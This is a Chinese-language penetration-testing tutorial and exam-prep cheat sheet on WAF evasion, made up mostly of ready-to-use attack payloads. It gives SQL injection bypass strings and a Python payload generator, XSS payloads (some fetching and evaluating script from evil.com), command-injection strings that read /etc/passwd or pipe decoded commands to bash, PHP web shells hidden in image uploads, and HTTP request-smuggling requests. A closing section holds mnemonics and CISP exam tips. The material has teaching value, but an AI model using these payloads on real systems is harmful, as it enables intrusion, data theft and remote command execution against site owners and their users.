# 渗透测试 WAF 绕过技术与免杀方法全集

> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：渗透测试

## 📋 提纲

1. WAF 检测原理
2. SQL注入 WAF 绕过
3. XSS WAF 绕过
4. 命令注入 WAF 绕过
5. 文件上传 WAF 绕过
6. 通用绕过技术

---

## 1. WAF 检测原理

```
WAF 工作模式：
1. 黑名单：匹配已知攻击特征
2. 白名单：只允许已知安全模式
3. 行为分析：检测异常请求行为
4. 机器学习：基于模型的异常检测

绕过思想：让攻击载荷不匹配黑名单特征，但目标应用仍然能解析
```

### 1.1 检测目标 WAF

```bash
# WAF指纹识别
nmap -p 80,443 --script http-waf-detect target.com
nmap -p 80,443 --script http-waf-fingerprint target.com

# wafw00f
wafw00f https://target.com

# 手动检测：发送恶意请求看响应
curl -sI "https://target.com/?id=1' OR '1'='1"
# 观察响应头：
# X-CDN: CloudFront → AWS WAF
# Server: cloudflare → Cloudflare
# X-Sucuri-ID → Sucuri
```

---

## 2. SQL注入 WAF 绕过

### 2.1 核心绕过技巧

```sql
-- 1. 关键字大小写/双写绕过
-- 原payload: UNION SELECT
-- 绕过：UnIoN SeLeCt
-- 绕过：UNIUNIONON SELESELECTCT
-- 绕过：%55NION %53ELECT (URL编码)

-- 2. 注释内联绕过
-- 绕过：/**/UN/**/ION/**/SE/**/LECT
-- 绕过：UN%0AION SE%0ALECT
-- 绕过：UN%23%0AION (MySQL # + 换行)

-- 3. 等价替换
-- ' OR '1'='1
-- ' OR 1=1--
-- ' || 1=1--
-- ' OR 'x'='x
-- ' OR 2>1--
-- ' OR 'a' BETWEEN 'a' AND 'c'--
-- ' OR 'a' IN ('a','b')--

-- 4. 空白字符绕过
-- 替代空格：/**/ %09 %0a %0d %0c %a0 %0b
-- UNION/**/SELECT
-- UNION%0aSELECT
-- UNION%09SELECT
-- UNION%a0SELECT

-- 5. 科学计数法绕过
-- 原：id=1 UNION SELECT 1,2,3
-- 绕过：id=1e0UNION SELECT 1,2,3
-- 绕过：id=1.UNION SELECT 1,2,3
```

### 2.2 自动化绕过脚本

```python
#!/usr/bin/env python3
"""SQL注入 WAF 绕过 Payload 生成器"""

class SQLiWAFBypass:
    def __init__(self):
        self.bypasses = [
            self.bypass_union_select,
            self.bypass_information_schema,
            self.bypass_or_and,
            self.bypass_comment,
            self.bypass_equal,
            self.bypass_space,
        ]

    def generate_payloads(self, base_payload):
        """基于原始payload生成100+绕过payload"""
        payloads = []
        for bypass_func in self.bypasses:
            payloads.extend(bypass_func(base_payload))
        return list(set(payloads))

    def bypass_union_select(self, payload):
        variations = []
        for p in [
            "UNION SELECT",
            "UNION ALL SELECT",
            "UNION DISTINCT SELECT",
            "/*!50000UNION*/ /*!50000SELECT*/",
            "UNION/*!50000*/SELECT",
            "UNION%0aSELECT",
            "UNION%09SELECT",
            "UNION%0dSELECT",
            "UNION/**/SELECT",
            "/**/UNION/**/SELECT/**/",
        ]:
            variations.append(payload.replace("UNION SELECT", p))
        return variations

    def bypass_information_schema(self, payload):
        """绕过 information_schema 黑名单"""
        # 替代方案：
        # MySQL 5.7+: sys.schema_table_statistics
        # MySQL 8.0+: TABLE_SCHEMA
        # 或者用存储过程报错信息泄露
        variations = []
        replacements = [
            ("information_schema.tables", "mysql.innodb_table_stats"),
            ("information_schema.columns", "sys.schema_table_statistics"),
            ("information_schema", "/*!50000%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61*/"),
            ("information_schema", "`information_schema`"),
        ]
        for old, new in replacements:
            variations.append(payload.replace(old, new))
        return variations

    def bypass_or_and(self, payload):
        variations = []
        # OR 替代
        for or_repl in ["||", "|", "OR", "oR", "|||"]:
            variations.append(payload.replace("OR", or_repl))
        # AND 替代
        for and_repl in ["&&", "%26%26", "AND", "aNd"]:
            variations.append(payload.replace("AND", and_repl))
        return variations

    def bypass_equal(self, payload):
        variations = []
        # = 替代
        for eq_repl in ["LIKE", "REGEXP", "BETWEEN", ">", "<", "!=", "IS NOT DISTINCT FROM"]:
            variations.append(payload.replace("=", f" {eq_repl} "))
        return variations

    def bypass_comment(self, payload):
        """注释符绕过"""
        variations = []
        for comment in ["-- ", "--+", "--%20", "#", "%23", ";%00", "/*"]:
            variations.append(payload.rstrip('- #') + comment)
        return variations

    def bypass_space(self, payload):
        """空白字符绕过"""
        spaces = ["/**/", "%09", "%0a", "%0d", "%0c", "%a0", "%0b",
                  "/*!12345*/", "/*!*/", "/*!50000*/"]
        results = []
        for space in spaces:
            results.append(payload.replace(" ", space))
        return results

# 使用示例
bypass = SQLiWAFBypass()
payloads = bypass.generate_payloads("' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--")
for i, p in enumerate(payloads[:10], 1):
    print(f"{i}. {p}")
```

---

## 3. XSS WAF 绕过

```html
<!-- 1. 标签闭合绕过 -->
<!-- 原：<img src=x onerror=alert(1)> -->
<img src=x onerror=alert(1)>
<img/src=x/onerror=alert(1)>
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>

<!-- 2. 事件绕过（黑名单onerror但漏了其他事件） -->
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- 3. 编码绕过 -->
<!-- HTML实体 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<!-- URL编码 -->
<img src=x onerror=%61%6c%65%72%74(1)>
<!-- 八进制 -->
<img src=x onerror=\141\154\145\162\164(1)>
<!-- Base64 -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<!-- 4. 字符串绕过 -->
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<img src=x onerror=top['alert'](1)>
<img src=x onerror=self['alert'](1)>
<img src=x onerror=window['al'%2B'ert'](1)>

<!-- 5. 混合绕过 -->
<img src=x onerror=&#x61;lert(1)>   <!-- 首字符HTML编码 -->
<img src=x onerror=\u0061lert(1)>   <!-- Unicode -->
<svg><script>alert(1)</script>      <!-- SVG下script可执行 -->
<math><mtext><![CDATA[<img src=x onerror=alert(1)>]]></mtext></math>

<!-- 6. 绕过长度限制 -->
<!-- 用外部JS -->
<svg/onload=import('//evil.com/x')>
<svg/onload=fetch('//evil.com/x').then(r=>eval(r.text))>
```

---

## 4. 命令注入 WAF 绕过

```bash
# 1. 命令分隔符绕过
# 原：; whoami
# 绕过：
| whoami
|| whoami
& whoami
&& whoami
%0a whoami
%0d%0a whoami
`whoami`
$(whoami)

# 2. 空格绕过
# 原：cat /etc/passwd
# 绕过：
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}
cat<>/etc/passwd

# 3. 关键字绕过
# 原：cat /etc/passwd
# 绕过：c"a"t /etc/passwd
# 绕过：c\at /etc/passwd
# 绕过：/bin/c?t /etc/passwd
# 绕过：/bin/c[a]t /etc/passwd
# 绕过：ca$()t /etc/passwd

# 4. 编码绕过
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
echo "636174202f6574632f706173737764" | xxd -r -p | sh

# 5. 路径绕过
/bin/cat /etc/passwd
/usr/bin/cat /etc/passwd
/bin/../../bin/cat /etc/passwd
```

---

## 5. 文件上传 WAF 绕过

```bash
# 1. 扩展名绕过
shell.php     # 被拦截
shell.pHp     # 大小写绕过
shell.php5    # PHP5扩展名
shell.phtml   # 替代扩展名
shell.pHP5
shell.php.    # 尾部加.
shell.php .   # 尾部加空格
shell.php::$DATA  # Windows NTFS
shell.php%00.jpg  # 00截断（老版本PHP）
shell.asp;.jpg    # IIS解析漏洞

# 2. Content-Type 绕过
Content-Type: application/x-php       # 被拦截
Content-Type: image/jpeg              # 伪装图片
Content-Type: image/gif
Content-Type: application/octet-stream

# 3. 文件内容绕过
# GIF89a头伪装
GIF89a
<?php system($_GET['cmd']);?>

# EXIF信息伪装
# 用exiftool给图片加PHP代码
exiftool -Comment='<?php system($_GET[1]);?>' image.jpg

# 4. 压缩包绕过
# 将WebShell放入zip，上传后利用zip://协议包含
zip shell.zip shell.php

# 5. .htaccess 绕过
# 上传.htaccess让Apache解析jpg为PHP
AddType application/x-httpd-php .jpg
# 然后上传含PHP代码的shell.jpg
```

---

## 6. 通用绕过技术

```python
# HTTP 请求走私 (Request Smuggling)
# CL.TE 走私
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G      ← 走私的请求从这里开始

# 分块传输绕过
POST / HTTP/1.1
Transfer-Encoding: chunked

9
<svg onlo
9
ad=alert(1
1
)>
0
```

---

## ✅ WAF 绕过 Checklist

- [ ] WAF 指纹识别
- [ ] SQL注入50+绕过payload
- [ ] XSS 20+绕过技巧
- [ ] 命令注入分隔符/空格/编码
- [ ] 文件上传扩展名/Content-Type/内容
- [ ] HTTP 走私测试

> 📚 延伸阅读：Penetration/003-SQL注入 | Penetration/004-XSS | Penetration/009-文件上传

---

## 高分考点与知识巧记

### 高分考点速查表

| 考点 | 考察维度 | 记忆要点 |
|------|----------|----------|
| WAF检测原理 | 基础理论 | 基于规则匹配(正则)、行为分析、机器学习；拦截/放行/人机验证三种响应 |
| SQL注入WAF绕过 | 实战技巧 | 编码绕过(URL/Unicode/十六进制)、注释绕过(/**/)、大小写变换、分块传输 |
| XSS WAF绕过 | 实战技巧 | 标签变形、事件句柄替代、编码混淆、SVG/数学标签 |
| 命令注入WAF绕过 | 实战技巧 | 分隔符替换(|/||/&)、空格替代(IFS/{})、通配符(?)与正则([]) |
| 文件上传WAF绕过 | 实战技巧 | 扩展名变种、Content-Type伪造、文件头伪装、.htaccess解析 |
| HTTP请求走私 | 高级技术 | CL.TE/TE.CL走私、利用前端与后端解析差异绕过WAF |

### 知识巧记口诀

> **WAF绕过总口诀**：
> 编码注释大小写，分块传输混合同；
> SQL注入tamper好，XSS变形事件多；
> 命令注入分隔符，空格IFS和花括号；
> 上传绕过改扩展，Content-Type加文件头；
> HTTP走私是神器，CL.TE和TE.CL要记牢。

> **Tamper组合记忆**：space2comment(空格→注释)、charencode(URL编码)、between(> < → BETWEEN)、equaltolike(= → LIKE)

### 考试陷阱提醒

| 陷阱 | 正确认知 |
|------|----------|
| ❌ WAF是万能的，绕过不可能 | ✅ WAF有局限性，多种绕过技术结合使用可有效规避 |
| ❌ 绕过WAF只需要一种方法 | ✅ 需要根据具体WAF产品选择组合策略，考试考工具选择 |
| ❌ HTTP走私仅用于绕过WAF | ✅ HTTP走私还可用于缓存投毒、请求劫持等多种攻击场景 |

> 💡 **一句话总结**：WAF是防护的第一道防线但绝非铜墙铁壁——掌握各类绕过技术的原理和组合运用是渗透测试工程师的必备技能。CISP考试重点考查绕过原理和工具选型。
